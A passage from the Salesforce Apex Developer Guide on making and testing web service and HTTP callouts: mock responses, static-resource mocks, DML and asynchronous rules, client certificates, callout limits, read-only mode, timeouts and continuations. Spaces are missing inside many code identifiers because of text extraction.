Stringecho= sample.EchoString(input);
returnecho;
}
}
613
Integration and Apex UtilitiesApex Developer Guide

This test class contains the test method that sets the mock callout mode. It calls the callEchoString method in the previous class
and verifies that a mock response is received.
@isTest
privateclassWebSvcCalloutTest{
@isTeststaticvoidtestEchoString(){
// Thiscausesa fakeresponseto be generated
Test.setMock(WebServiceMock.class, new WebServiceMockImpl());
// Callthe methodthatinvokesa callout
Stringoutput= WebSvcCallout.callEchoString('HelloWorld!');
// Verifythata fakeresultis returned
System.assertEquals('Mockresponse', output);
}
}
SEE ALSO:
Apex Reference Guide: WebServiceMock Interface
Performing DML Operations and Mock Callouts
By default, callouts aren’t allowed after DML operations in the same transaction because DML operations result in pending uncommitted
work that prevents callouts from executing. Sometimes, you might want to insert test data in your test method using DML before making
a callout. To enable this, enclose the portion of your code that performs the callout within Test.startTest and Test.stopTest
statements. The Test.startTest statement must appear before the Test.setMock statement. Also, the calls to DML operations
must not be part of the Test.startTest/Test.stopTest block.
DML operations that occur after mock callouts are allowed and don’t require any changes in test methods.
Performing DML Before Mock Callouts
This example is based on the previous example. The example shows how to use Test.startTest and Test.stopTest
statements to allow DML operations to be performed in a test method before mock callouts. The test method (testEchoString)
first inserts a test account, calls Test.startTest, sets the mock callout mode using Test.setMock, calls a method that performs
the callout, verifies the mock response values, and finally, calls Test.stopTest.
@isTest
privateclassWebSvcCalloutTest{
@isTeststaticvoidtestEchoString(){
// PerformsomeDML to inserttestdata
AccounttestAcct= new Account('TestAccount');
inserttestAcct;
// CallTest.startTestbeforeperformingcallout
// but aftersettingtestdata.
Test.startTest();
// Set mockcalloutclass
Test.setMock(WebServiceMock.class,new WebServiceMockImpl());
// Callthe methodthatinvokesa callout
Stringoutput= WebSvcCallout.callEchoString('HelloWorld!');
614
Integration and Apex UtilitiesApex Developer Guide

// Verifythata fakeresultis returned
System.assertEquals('Mockresponse', output);
Test.stopTest();
}
}
Asynchronous Apex and Mock Callouts
Similar to DML, asynchronous Apex operations result in pending uncommitted work that prevents callouts from being performed later
in the same transaction. Examples of asynchronous Apex operations are calls to future methods, batch Apex, or scheduled Apex. These
asynchronous calls are typically enclosed within Test.startTest and Test.stopTest statements in test methods so that
they execute after Test.stopTest. In this case, mock callouts can be performed after the asynchronous calls and no changes are
necessary. But if the asynchronous calls aren’t enclosed within Test.startTest and Test.stopTest statements, you’ll get
an exception because of uncommitted work pending. To prevent this exception, do either of the following:
•
Enclose the asynchronous call within Test.startTest and Test.stopTest statements.
Test.startTest();
MyClass.asyncCall();
Test.stopTest();
Test.setMock(..);// Takestwo arguments
MyClass.mockCallout();
•
Follow the same rules as with DML calls: Enclose the portion of your code that performs the callout within Test.startTest
and Test.stopTest statements. The Test.startTest statement must appear before the Test.setMock statement.
Also, the asynchronous calls must not be part of the Test.startTest/Test.stopTest block.
MyClass.asyncCall();
Test.startTest();
Test.setMock(..);// Takestwo arguments
MyClass.mockCallout();
Test.stopTest();
Asynchronous calls that occur after mock callouts are allowed and don’t require any changes in test methods.
SEE ALSO:
Apex Reference Guide: Test Class
Considerations Using WSDLs
Be aware of the following when generating Apex classes from a WSDL.
SOAP Web Service Callout
For WSDLs that require namespace changes within the SOAP requests, you must manually construct the HTTP request body and invoke
the endpoint as a POST request from Apex.
615
Integration and Apex UtilitiesApex Developer Guide

Mapping Headers
Headers defined in the WSDL document become public fields on the stub in the generated class. This is similar to how the AJAX Toolkit
and .NET works.
Understanding Runtime Events
The following checks are performed when Apex code is making a callout to an external service.
•
For information on the timeout limits when making an HTTP request or a Web services call, see Callout Limits and Limitations on
page 627.
•
Circular references in Apex classes are not allowed.
•
More than one loopback connection to Salesforce domains is not allowed.
•
To allow an endpoint to be accessed, register it from Setup by entering RemoteSiteSettings in the QuickFind box,
then selecting Remote Site Settings.
•
To prevent database connections from being held up, no transactions can be open.
Understanding Unsupported Characters in Variable Names
A WSDL file can include an element name that is not allowed in an Apex variable name. The following rules apply when generating
Apex variable names from a WSDL file:
•
If the first character of an element name is not alphabetic, an x character is prepended to the generated Apex variable name.
•
If the last character of an element name is not allowed in an Apex variable name, an x character is appended to the generated Apex
variable name.
•
If an element name contains a character that is not allowed in an Apex variable name, the character is replaced with an underscore
(_) character.
•
If an element name contains two characters in a row that are not allowed in an Apex variable name, the first character is replaced
with an underscore (_) character and the second one is replaced with an x character. This avoids generating a variable name with
two successive underscores, which is not allowed in Apex.
•
Suppose you have an operation that takes two parameters, a_ and a_x. The generated Apex has two variables, both named a_x.
The class doesn’t compile. Manually edit the Apex and change one of the variable names.
Debugging Classes Generated from WSDL Files
Salesforce tests code with SOAP API, .NET, and Axis. If you use other tools, you can encounter issues.
You can use the debugging header to return the XML in request and response SOAP messages to help you diagnose problems. For more
information, see SOAP API Developer Guide: DebuggingHeader.
Invoking HTTP Callouts
Apex provides several built-in classes to work with HTTP services and create HTTP requests like GET, POST, PUT, and DELETE.
You can use these HTTP classes to integrate to REST-based services. They also allow you to integrate to SOAP-based web services as an
alternate option to generating Apex code from a WSDL. By using the HTTP classes, instead of starting with a WSDL, you take on more
responsibility for handling the construction of the SOAP message for the request and response.
1.HTTP Classes
616
Integration and Apex UtilitiesApex Developer Guide

2.Testing HTTP Callouts
To deploy or package Apex, 75% of your code must have test coverage. By default, test methods don’t support HTTP callouts, so
tests that perform callouts fail. Enable HTTP callout testing by instructing Apex to generate mock responses in tests, using
Test.setMock.
HTTP Classes
These classes expose the HTTP request and response functionality.
•
HttpClass. Use this class to initiate an HTTP request and response.
•
HttpRequest Class: Use this class to programmatically create HTTP requests like GET, POST, PATCH, PUT, and DELETE.
•
HttpResponse Class: Use this class to handle the HTTP response returned by HTTP.
The HttpRequest and HttpResponse classes support these elements.
•
HttpRequest
–
HTTP request types, such as GET, POST, PATCH, PUT, DELETE, TRACE, CONNECT, HEAD, and OPTIONS
–
Request headers if needed
–
Read and connection timeouts
–
Redirects if needed
–
Content of the message body
•
HttpResponse
–
The HTTP status code
–
Response headers if needed
–
Content of the response body
This example makes an HTTP GET request to the external server passed to the getCalloutResponseContents method in the
url parameter. This example also accesses the body of the returned response.
publicclassHttpCalloutSample{
// Passin the endpointto be usedusingthe stringurl
publicStringgetCalloutResponseContents(Stringurl){
// Instantiatea new Httpobject
Httph = new Http();
// Instantiatea new HTTPrequest,specifythe method(GET)as wellas the endpoint
HttpRequestreq = new HttpRequest();
req.setEndpoint(url);
req.setMethod('GET');
// Sendthe request,and returna response
HttpResponseres = h.send(req);
returnres.getBody();
}
}
The previous example runs synchronously, meaning no further processing happens until the external web service returns a response.
Alternatively, you can use the @future annotation to make the callout run asynchronously.
617
Integration and Apex UtilitiesApex Developer Guide

This example makes an HTTP POST request to the external server passed to the getPostCalloutResponseContents method
in the url parameter. Replace Your_JSON_Content with the JSON content that you want to send in the callout.
publicclassHttpPostCalloutSample{
// Passin the endpointto be usedusingthe stringurl
publicStringgetPostCalloutResponseContents(Stringurl){
// Instantiatea new Httpobject
Httph = new Http();
// Instantiatea new HTTPrequest
// Specifyrequestpropertiessuchas the endpoint,the POSTmethod,etc.
HttpRequestreq = new HttpRequest();
req.setEndpoint(url);
req.setMethod('POST');
req.setHeader('Content-Type', 'application/json');
req.setBody('{Your_JSON_Content}');
// Sendthe request,and returna response
HttpResponseres = h.send(req);
returnres.getBody();
}
}
To access an external server from an endpoint or a redirect endpoint, add the remote site to a list of authorized remote sites. Log in to
Salesforce and from Setup, in the Quick Find box, enter RemoteSiteSettings, and then select Remote Site Settings.
Use the XML classes or JSON classes to parse XML or JSON content in the body of a request created by HttpRequest, or a response
accessed by HttpResponse.
Considerations
•
The AJAX proxy handles redirects and authentication challenges (401/407 responses) automatically. For more information about
the AJAX proxy, see AJAX Toolkit documentation.
•
You can set the endpoint as a named credential URL. A named credential URL contains the scheme callout:, the name of the
named credential, and an optional path. For example: callout:My_Named_Credential/some_path. A named credential
specifies the URL of a callout endpoint and its required authentication parameters in one definition. Salesforce manages all
authentication for Apex callouts that specify a named credential as the callout endpoint so that your code doesn’t have to. You can
also skip remote site settings, which are otherwise required for callouts to external sites, for the site defined in the named credential.
See Named Credentials as Callout Endpoints.
•
When you set a request body in the callout, set the method to POST. If you set a request body and the request method is GET, a
POST request is performed.
•
Callouts are blocked if you have pending uncommitted transactions from DML operations, queueable jobs (that are queued with
System.enqueueJob), Database.executeBatch, or future methods.
Testing HTTP Callouts
To deploy or package Apex, 75% of your code must have test coverage. By default, test methods don’t support HTTP callouts, so tests
that perform callouts fail. Enable HTTP callout testing by instructing Apex to generate mock responses in tests, using Test.setMock.
Specify the mock response in one of the following ways.
•
By implementing the HttpCalloutMock interface
618
Integration and Apex UtilitiesApex Developer Guide

•
By using Static Resources with StaticResourceCalloutMock or MultiStaticResourceCalloutMock
To enable running DML operations before mock callouts in your test methods, see Performing DML Operations and Mock Callouts.
Testing HTTP Callouts by Implementing the HttpCalloutMock Interface
Testing HTTP Callouts Using Static Resources
Performing DML Operations and Mock Callouts
Testing HTTP Callouts by Implementing the HttpCalloutMock Interface
Provide an implementation for the HttpCalloutMock interface to specify the response sent in the respond method, which the
Apex runtime calls to send a response for a callout.
globalclassYourHttpCalloutMockImplimplementsHttpCalloutMock{
globalHTTPResponserespond(HTTPRequestreq){
// Createa fakeresponse.
// Set responsevalues,and
// returnresponse.
}
}
Note:
•
The class that implements the HttpCalloutMock interface can be either global or public.
•
You can annotate this class with @isTest since it will be used only in test context. In this way, you can exclude it from your
organization’s code size limit of 6 MB.
Now that you have specified the values of the fake response, instruct the Apex runtime to send this fake response by calling
Test.setMock in your test method. For the first argument, pass HttpCalloutMock.class, and for the second argument,
pass a new instance of your interface implementation of HttpCalloutMock, as follows:
Test.setMock(HttpCalloutMock.class, newYourHttpCalloutMockImpl());
After this point, if an HTTP callout is invoked in test context, the callout is not made and you receive the mock response you specified in
the respond method implementation.
Note:  To mock a callout if the code that performs the callout is in a managed package, call Test.setMock from a test method
in the same package with the same namespace.
This is a full example that shows how to test an HTTP callout. The interface implementation (MockHttpResponseGenerator) is
listed first. It is followed by a class containing the test method and another containing the method that the test calls. The testCallout
test method sets the mock callout mode by calling Test.setMock before calling getInfoFromExternalService. It then
verifies that the response returned is what the implemented respond method sent. Save each class separately and run the test in
CalloutClassTest.
@isTest
globalclassMockHttpResponseGeneratorimplementsHttpCalloutMock{
// Implementthisinterfacemethod
globalHTTPResponserespond(HTTPRequestreq){
// Optionally,onlysenda mockresponsefor a specificendpoint
// and method.
System.assertEquals('https://example.com/example/test', req.getEndpoint());
System.assertEquals('GET', req.getMethod());
619
Integration and Apex UtilitiesApex Developer Guide

// Createa fakeresponse
HttpResponseres = new HttpResponse();
res.setHeader('Content-Type', 'application/json');
res.setBody('{"example":"test"}');
res.setStatusCode(200);
returnres;
}
}
publicclassCalloutClass{
publicstaticHttpResponsegetInfoFromExternalService(){
HttpRequestreq = new HttpRequest();
req.setEndpoint('https://example.com/example/test');
req.setMethod('GET');
Httph = new Http();
HttpResponseres = h.send(req);
returnres;
}
}
@isTest
privateclassCalloutClassTest{
@isTeststaticvoidtestCallout(){
// Set mockcalloutclass
Test.setMock(HttpCalloutMock.class, new MockHttpResponseGenerator());
// Callmethodto test.
// Thiscausesa fakeresponseto be sent
// fromthe classthatimplementsHttpCalloutMock.
HttpResponseres = CalloutClass.getInfoFromExternalService();
// Verifyresponsereceivedcontainsfakevalues
StringcontentType= res.getHeader('Content-Type');
System.assert(contentType== 'application/json');
StringactualValue= res.getBody();
StringexpectedValue= '{"example":"test"}';
System.assertEquals(actualValue,expectedValue);
System.assertEquals(200,res.getStatusCode());
}
}
SEE ALSO:
Apex Reference Guide: HttpCalloutMock Interface
Apex Reference Guide: Test Class
Testing HTTP Callouts Using Static Resources
You can test HTTP callouts by specifying the body of the response you’d like to receive in a static resource and using one of two built-in
classes—StaticResourceCalloutMock or MultiStaticResourceCalloutMock.
620
Integration and Apex UtilitiesApex Developer Guide

Testing HTTP Callouts Using StaticResourceCalloutMock
Apex provides the built-in StaticResourceCalloutMock class that you can use to test callouts by specifying the response
body in a static resource. When using this class, you don’t have to provide your own implementation of the HttpCalloutMock
interface. Instead, just create an instance of StaticResourceCalloutMock and set the static resource to use for the response
body, along with other response properties, like the status code and content type.
First, you must create a static resource from a text file to contain the response body:
1.Create a text file that contains the response body to return. The response body can be an arbitrary string, but it must match the
content type, if specified. For example, if your response has no content type specified, the file can include the arbitrary string abc.
If you specify a content type of application/json for the response, the file content should be a JSON string, such as {"hah":"fooled
you"}.
2.Create a static resource for the text file:
a.From Setup, enter StaticResources in the QuickFind box, then select Static Resources.
b.Click New.
c.Name your static resource.
d.Choose the file to upload.
e.Click Save.
To learn more about static resources, see “Defining Static Resources” in the Salesforce online help.
Next, create an instance of StaticResourceCalloutMock and set the static resource, and any other properties.
StaticResourceCalloutMockmock= new StaticResourceCalloutMock();
mock.setStaticResource('myStaticResourceName');
mock.setStatusCode(200);
mock.setHeader('Content-Type', 'application/json');
In your test method, call Test.setMock to set the mock callout mode and pass it HttpCalloutMock.class as the first
argument, and the variable name that you created for StaticResourceCalloutMock as the second argument.
Test.setMock(HttpCalloutMock.class,mock);
After this point, if your test method performs a callout, the callout is not made and the Apex runtime sends the mock response you
specified in your instance of StaticResourceCalloutMock.
Note:  To mock a callout if the code that performs the callout is in a managed package, call Test.setMock from a test method
in the same package with the same namespace.
This is a full example containing the test method (testCalloutWithStaticResources) and the method it is testing
(getInfoFromExternalService) that performs the callout. Before running this example, create a static resource named
mockResponse based on a text file with the content {"hah":"fooledyou"}. Save each class separately and run the test in
CalloutStaticClassTest.
publicclassCalloutStaticClass{
publicstaticHttpResponsegetInfoFromExternalService(Stringendpoint){
HttpRequestreq = new HttpRequest();
req.setEndpoint(endpoint);
req.setMethod('GET');
Httph = new Http();
HttpResponseres = h.send(req);
returnres;
621
Integration and Apex UtilitiesApex Developer Guide

}
}
@isTest
privateclassCalloutStaticClassTest{
@isTeststaticvoidtestCalloutWithStaticResources(){
// Use StaticResourceCalloutMockbuilt-inclassto
// specifyfakeresponseand includeresponsebody
// in a staticresource.
StaticResourceCalloutMockmock= new StaticResourceCalloutMock();
mock.setStaticResource('mockResponse');
mock.setStatusCode(200);
mock.setHeader('Content-Type', 'application/json');
// Set the mockcalloutmode
Test.setMock(HttpCalloutMock.class, mock);
// Callthe methodthatperformsthe callout
HTTPResponseres = CalloutStaticClass.getInfoFromExternalService(
'https://example.com/example/test');
// Verifyresponsereceivedcontainsvaluesreturnedby
// the mockresponse.
// Thisis the contentof the staticresource.
System.assertEquals('{"hah":"fooledyou"}', res.getBody());
System.assertEquals(200,res.getStatusCode());
System.assertEquals('application/json', res.getHeader('Content-Type'));
}
}
Testing HTTP Callouts Using MultiStaticResourceCalloutMock
Apex provides the built-in MultiStaticResourceCalloutMock class that you can use to test callouts by specifying the
response body in a static resource for each endpoint. This class is similar to StaticResourceCalloutMock except that it allows
you to specify multiple response bodies. When using this class, you don’t have to provide your own implementation of the
HttpCalloutMock interface. Instead, just create an instance of MultiStaticResourceCalloutMock and set the static
resource to use per endpoint. You can also set other response properties like the status code and content type.
First, you must create a static resource from a text file to contain the response body. See the procedure outlined in Testing HTTP Callouts
Using StaticResourceCalloutMock.
Next, create an instance of MultiStaticResourceCalloutMock and set the static resource, and any other properties.
MultiStaticResourceCalloutMockmultimock= new MultiStaticResourceCalloutMock();
multimock.setStaticResource('https://example.com/example/test', 'mockResponse');
multimock.setStaticResource('https://example.com/example/sfdc', 'mockResponse2');
multimock.setStatusCode(200);
multimock.setHeader('Content-Type', 'application/json');
In your test method, call Test.setMock to set the mock callout mode and pass it HttpCalloutMock.class as the first
argument, and the variable name that you created for MultiStaticResourceCalloutMock as the second argument.
Test.setMock(HttpCalloutMock.class,multimock);
622
Integration and Apex UtilitiesApex Developer Guide

After this point, if your test method performs an HTTP callout to one of the endpoints https://example.com/example/test
or https://example.com/example/sfdc, the callout is not made and the Apex runtime sends the corresponding mock
response you specified in your instance of MultiStaticResourceCalloutMock.
This is a full example containing the test method (testCalloutWithMultipleStaticResources) and the method it is
testing (getInfoFromExternalService) that performs the callout. Before running this example, create a static resource named
mockResponse based on a text file with the content {"hah":"fooledyou"} and another named mockResponse2
based on a text file with the content {"hah":"fooledyou twice"}. Save each class separately and run the test in
CalloutMultiStaticClassTest.
publicclassCalloutMultiStaticClass{
publicstaticHttpResponsegetInfoFromExternalService(Stringendpoint){
HttpRequestreq = new HttpRequest();
req.setEndpoint(endpoint);
req.setMethod('GET');
Httph = new Http();
HttpResponseres = h.send(req);
returnres;
}
}
@isTest
privateclassCalloutMultiStaticClassTest{
@isTeststaticvoidtestCalloutWithMultipleStaticResources(){
// Use MultiStaticResourceCalloutMockto
// specifyfakeresponsefor a certainendpointand
// includeresponsebodyin a staticresource.
MultiStaticResourceCalloutMockmultimock= new MultiStaticResourceCalloutMock();
multimock.setStaticResource(
'https://example.com/example/test', 'mockResponse');
multimock.setStaticResource(
'https://example.com/example/sfdc', 'mockResponse2');
multimock.setStatusCode(200);
multimock.setHeader('Content-Type', 'application/json');
// Set the mockcalloutmode
Test.setMock(HttpCalloutMock.class, multimock);
// Callthe methodfor the firstendpoint
HTTPResponseres = CalloutMultiStaticClass.getInfoFromExternalService(
'https://example.com/example/test');
// Verifyresponsereceived
System.assertEquals('{"hah":"fooledyou"}', res.getBody());
// Callthe methodfor the secondendpoint
HTTPResponseres2= CalloutMultiStaticClass.getInfoFromExternalService(
'https://example.com/example/sfdc');
// Verifyresponsereceived
System.assertEquals('{"hah":"fooledyou twice"}', res2.getBody());
}
}
623
Integration and Apex UtilitiesApex Developer Guide

Performing DML Operations and Mock Callouts
By default, callouts aren’t allowed after DML operations in the same transaction because DML operations result in pending uncommitted
work that prevents callouts from executing. Sometimes, you might want to insert test data in your test method using DML before making
a callout. To enable this, enclose the portion of your code that performs the callout within Test.startTest and Test.stopTest
statements. The Test.startTest statement must appear before the Test.setMock statement. Also, the calls to DML operations
must not be part of the Test.startTest/Test.stopTest block.
DML operations that occur after mock callouts are allowed and don’t require any changes in test methods.
The DML operations support works for all implementations of mock callouts using: the HttpCalloutMock interface and static
resources (StaticResourceCalloutMock or MultiStaticResourceCalloutMock). The following example uses an
implemented HttpCalloutMock interface but you can apply the same technique when using static resources.
Performing DML Before Mock Callouts
This example is based on the HttpCalloutMock example provided earlier. The example shows how to use Test.startTest and
Test.stopTest statements to allow DML operations to be performed in a test method before mock callouts. The test method
(testCallout) first inserts a test account, calls Test.startTest, sets the mock callout mode using Test.setMock, calls a
method that performs the callout, verifies the mock response values, and finally, calls Test.stopTest.
@isTest
privateclassCalloutClassTest{
@isTeststaticvoidtestCallout(){
// PerformsomeDML to inserttestdata
AccounttestAcct= new Account('TestAccount');
inserttestAcct;
// CallTest.startTestbeforeperformingcallout
// but aftersettingtestdata.
Test.startTest();
// Set mockcalloutclass
Test.setMock(HttpCalloutMock.class,new MockHttpResponseGenerator());
// Callmethodto test.
// Thiscausesa fakeresponseto be sent
// fromthe classthatimplementsHttpCalloutMock.
HttpResponseres = CalloutClass.getInfoFromExternalService();
// Verifyresponsereceivedcontainsfakevalues
StringcontentType= res.getHeader('Content-Type');
System.assert(contentType== 'application/json');
StringactualValue= res.getBody();
StringexpectedValue= '{"example":"test"}';
System.assertEquals(actualValue,expectedValue);
System.assertEquals(200,res.getStatusCode());
Test.stopTest();
}
}
624
Integration and Apex UtilitiesApex Developer Guide

Asynchronous Apex and Mock Callouts
Similar to DML, asynchronous Apex operations result in pending uncommitted work that prevents callouts from being performed later
in the same transaction. Examples of asynchronous Apex operations are calls to future methods, batch Apex, or scheduled Apex. These
asynchronous calls are typically enclosed within Test.startTest and Test.stopTest statements in test methods so that
they execute after Test.stopTest. In this case, mock callouts can be performed after the asynchronous calls and no changes are
necessary. But if the asynchronous calls aren’t enclosed within Test.startTest and Test.stopTest statements, you’ll get
an exception because of uncommitted work pending. To prevent this exception, do either of the following:
•
Enclose the asynchronous call within Test.startTest and Test.stopTest statements.
Test.startTest();
MyClass.asyncCall();
Test.stopTest();
Test.setMock(..);// Takestwo arguments
MyClass.mockCallout();
•
Follow the same rules as with DML calls: Enclose the portion of your code that performs the callout within Test.startTest
and Test.stopTest statements. The Test.startTest statement must appear before the Test.setMock statement.
Also, the asynchronous calls must not be part of the Test.startTest/Test.stopTest block.
MyClass.asyncCall();
Test.startTest();
Test.setMock(..);// Takestwo arguments
MyClass.mockCallout();
Test.stopTest();
Asynchronous calls that occur after mock callouts are allowed and don’t require any changes in test methods.
SEE ALSO:
Apex Reference Guide: Test Class
Using Certificates
To use two-way SSL authentication, send a certificate with your callout that was either generated in Salesforce or signed by a certificate
authority (CA). Sending a certificate enhances security because the target of the callout receives the certificate and can use it to authenticate
the request against its keystore.
To enable two-way SSL authentication for a callout:
1.Generate a certificate.
2.Integrate the certificate with your code. See Using Certificates with SOAP Services and Using Certificates with HTTP Requests.
3.If you’re connecting to a third party and using a self-signed certificate, share the Salesforce certificate with them so that they can
add the certificate to their keystore. If you’re connecting to another application, generate and integrate the certificate with your
code, and then ensure that the Web or application server is configured to accept the certificate. This process depends on the type
of Web or application server you use.
4.Configure the remote site settings for the callout. Before any Apex callout can call an external site, that site must be registered in
the Remote Site Settings page, or the callout fails.
If the callout specifies a named credential as the endpoint, you don’t need to configure remote site settings. To set up named
credentials, see Named Credentials and External Credentials in Salesforce Help.
625
Integration and Apex UtilitiesApex Developer Guide

1.Generating Certificates
2.Using Certificates with SOAP Services
To support two-way authentication for a callout to a SOAP web service, generate a certificate in Salesforce or import a key pair from
a keystore into Salesforce. Then integrate the certificate with your Apex.
3.Using Certificates with HTTP Requests
Generating Certificates
You can use a self-signed certificate generated in Salesforce or a certificate signed by a certificate authority (CA). To generate a certificate
for a callout, see Generate a Certificate.
After you successfully save a Salesforce certificate, the certificate and corresponding keys are automatically generated.
After you create a CA-signed certificate, you must upload the signed certificate before you can use it. See “Generate a Certificate Signed
by a Certificate Authority” in the Salesforce online help.
Using Certificates with SOAP Services
To support two-way authentication for a callout to a SOAP web service, generate a certificate in Salesforce or import a key pair from a
keystore into Salesforce. Then integrate the certificate with your Apex.
Important:  We recommend storing mutual authentication certificates for external web services in a Java keystore. For more
information, see Certificates and Keys.
To integrate the certificate with your Apex:
1.Receive the WSDL for the web service from the third party, or generate it from the application you want to connect to.
2.Generate Apex classes from the WSDL for the web service. See SOAP Services: Defining a Class from a WSDL Document.
3.The generated Apex classes include a stub for calling the third-party web service represented by the WSDL document. Edit the Apex
classes, and assign a value to a clientCertName_x variable on an instance of the stub class. The value must match the Unique
Name of the certificate that you generated on the Certificate and Key Management page.
This example illustrates editing the Apex classes and works with the sample WSDL file in Generated WSDL2Apex Code. The example
assumes that you generated a certificate with the UniqueName of DocSampleCert.
docSample.DocSamplePortstub= new docSample.DocSamplePort();
stub.clientCertName_x= 'DocSampleCert';
Stringinput= 'Thisis the inputstring';
Stringoutput= stub.EchoString(input);
Using Certificates with HTTP Requests
After you have generated a certificate in Salesforce, you can use it to support two-way authentication for a callout to an HTTP request.
To integrate the certificate with your Apex:
1.Generate a certificate. Note the UniqueName of the certificate.
2.In your Apex, use the setClientCertificateName method of the HttpRequest class. The value used for the argument
for this method must match the UniqueName of the certificate that you generated in the previous step.
626
Integration and Apex UtilitiesApex Developer Guide

The following example illustrates the last step of the previous procedure. This example assumes that you previously generated a certificate
with a UniqueName of DocSampleCert.
HttpRequestreq = new HttpRequest();
req.setClientCertificateName('DocSampleCert');
Callout Limits and Limitations
The following limits and limitations apply when Apex code makes a callout to an HTTP request or a web services call. The web services
call can be a SOAP API call or any external web services call.
•
A single Apex transaction can make a maximum of 100 callouts to an HTTP request or an API call.
•
In Developer Edition orgs, you can only make up to 20 concurrent callouts to endpoints outside of your Salesforce org’s domain.
This limit doesn’t apply to non-Developer Edition orgs.
•
The default timeout is 10 seconds. A custom timeout can be defined for each callout. The minimum is 1 millisecond and the maximum
is 120,000 milliseconds. See the examples in the next section for how to set custom timeouts for Web services or HTTP callouts.
•
The maximum cumulative timeout for callouts by a single Apex transaction is 120 seconds. This time is additive across all callouts
invoked by the Apex transaction.
•
Every org has a limit on long-running requests that run for more than 5 seconds (total execution time). HTTP callout processing time
is not included when calculating this limit. We pause the timer for the callout and resume it when the callout completes. See Execution
Governors and Limits for Lightning Platform Apex limits.
•
You can’t make a callout when there are pending operations in the same transaction. Things that result in pending operations are
DML statements, asynchronous Apex (such as future methods and batch Apex jobs), scheduled Apex, or sending email. You can
make callouts before performing these types of operations.
•
Pending operations can occur before mock callouts in the same transaction. See Performing DML Operations and Mock Callouts for
WSDL-based callouts or Performing DML Operations and Mock Callouts for HTTP callouts.
•
When the header Expect:100-Continue is added to a callout request and a HTTP/1.1100 Continue response
isn’t returned by the external server, a timeout occurs.
Apex Callouts in Read-Only Mode
During read-only mode, Apex callouts to external services execute and aren’t blocked by the system. Typically, you execute some
follow-up operations in the same transaction after receiving a response from a callout. For example, you can make a DML call to update
a Salesforce record. But write operations in Salesforce, such as record updates, are blocked during read-only mode. This inconsistency
in behavior in read-only mode can break your program flow and causes issues. To avoid incorrect program behavior, we recommend
that you prevent making callouts in read-only mode. To check whether the org is in read-only mode, call
System.getApplicationReadWriteMode().
The following example checks the return value of System.getApplicationReadWriteMode(). If the return value is equal
to ApplicationReadWriteMode.READ_ONLY enum value, the org is in read-only mode and the callout is skipped. Otherwise
(ApplicationReadWriteMode.DEFAULT value), the callout is performed.
Note:  This class uses Apex HTTP classes to make a callout as an example. You can also make a callout using an imported WSDL
through WSDL2Apex. The process for checking for read-only mode is the same in either case.
publicclassHttpCalloutSampleReadOnly{
publicclassMyReadOnlyExceptionextendsException{}
// Passin the endpointto be usedusingthe stringurl
publicStringgetCalloutResponseContents(Stringurl){
627
Integration and Apex UtilitiesApex Developer Guide

// Get Read-onlymodestatus
ApplicationReadWriteModemode= System.getApplicationReadWriteMode();
StringreturnValue= '';
if (mode== ApplicationReadWriteMode.READ_ONLY){
// Preventthe callout
thrownew MyReadOnlyException('Read-onlymode.Skippingcallouts!');
} elseif (mode== ApplicationReadWriteMode.DEFAULT){
// Instantiatea new httpobject
Httph = new Http();
// Instantiatea new HTTPrequest,specifythe method(GET)
// as wellas the endpoint.
HttpRequestreq = new HttpRequest();
req.setEndpoint(url);
req.setMethod('GET');
// Sendthe request,and returna response
HttpResponseres = h.send(req);
returnValue= res.getBody();
}
returnreturnValue;
}
}
Your Salesforce org is in read-only mode during some Salesforce maintenance activities, such as planned site switches and instance
refreshes. As part of Continuous Site Switching, your Salesforce org is switched to its ready site approximately once every six months.
For more information about site switching, see Continuous Site Switching.
To test read-only mode in sandbox, contact Salesforce to enable the read-only mode test option. Once the test option is enabled, you
can toggle read-only mode on and verify your apps.
Setting Callout Timeouts
The following example sets a custom timeout for Web services callouts. The example works with the sample WSDL file and the generated
DocSamplePort class described in Generated WSDL2Apex Code on page 609. Set the timeout value in milliseconds by assigning a
value to the special timeout_x variable on the stub.
docSample.DocSamplePortstub= new docSample.DocSamplePort();
stub.timeout_x= 2000;// timeoutin milliseconds
The following is an example of setting a custom timeout for HTTP callouts:
HttpRequestreq = new HttpRequest();
req.setTimeout(2000);// timeoutin milliseconds
Make Long-Running Callouts with Continuations
Use asynchronous callouts to make long-running requests from a Visualforce page or a Lightning component to an external Web service
and process responses in callback methods.
An asynchronous callout is a callout that is made from a Visualforce page or a Lightning component for which the response is returned
through a callback method. An asynchronous callout is also referred to as a continuation.
628
Integration and Apex UtilitiesApex Developer Guide

Visualforce Example
This diagram shows the execution path of an asynchronous callout, starting from a Visualforce page. A user invokes an action on a
Visualforce page that requests information from a Web service (step 1). The app server hands the callout request to the Continuation
server before returning to the Visualforce page (steps 2–3). The Continuation server sends the request to the Web service and receives
the response (steps 4–7), then hands the response back to the app server (step 8). Finally, the response is returned to the Visualforce
page (step 9).
Execution Flow of an Asynchronous Callout
A typical Salesforce application that benefits from asynchronous callouts contains a Visualforce page with a button. Users click that
button to get data from an external Web service. For example, a Visualforce page that gets warranty information for a certain product
from a Web service. Thousands of agents in the organization can use this page. Therefore, a hundred of those agents can click the same
button to process warranty information for products at the same time. These hundred simultaneous actions exceed the limit of concurrent
long-running requests on page 348 . But by using asynchronous callouts, the requests aren’t subjected to this limit and can be executed.
In the following example application, the button action is implemented in an Apex controller method. The action method creates a
Continuation and returns it. After the request is sent to the service, the Visualforce request is suspended. The user must wait for
the response to be returned before proceeding with using the page and invoking new actions. When the external service returns a
response, the Visualforce request resumes and the page receives this response.
This is the Visualforce page of our sample application. This page contains a button that invokes the startRequest method of the
controller that’s associated with this page. After the continuation result is returned and the callback method is invoked, the button
renders the outputText component again to display the body of the response.
<apex:pagecontroller="ContinuationController"showChat="false"showHeader="false">
<apex:form>
<!--Invokesthe actionmethodwhenthe userclicksthisbutton.-->
<apex:commandButtonaction="{!startRequest}"
value="StartRequest"reRender="result"/>
</apex:form>
<!--Thisoutputtextcomponentdisplaysthe calloutresponsebody.-->
<apex:outputTextid="result"value="{!result}"/>
</apex:page>
The following is the Apex controller that’s associated with the Visualforce page. This controller contains the action and callback methods.
629
Integration and Apex UtilitiesApex Developer Guide

Note:  Before you can call an external service, you must add the remote site to a list of authorized remote sites in the Salesforce
user interface. From Setup, enter RemoteSiteSettings in the QuickFind box, then select Remote Site Settings,
and then click New Remote Site.
If the callout specifies a named credential as the endpoint, you don’t need to configure remote site settings. A named credential
specifies the URL of a callout endpoint and its required authentication parameters in one definition. To set up named credentials,
see Define a Named Credential in Salesforce Help. In your code, specify the named credential URL instead of the long-running
service URL. A named credential URL contains the scheme callout:, the name of the named credential, and an optional path.
For example: callout:My_Named_Credential/some_path.
publicwithsharingclassContinuationController{
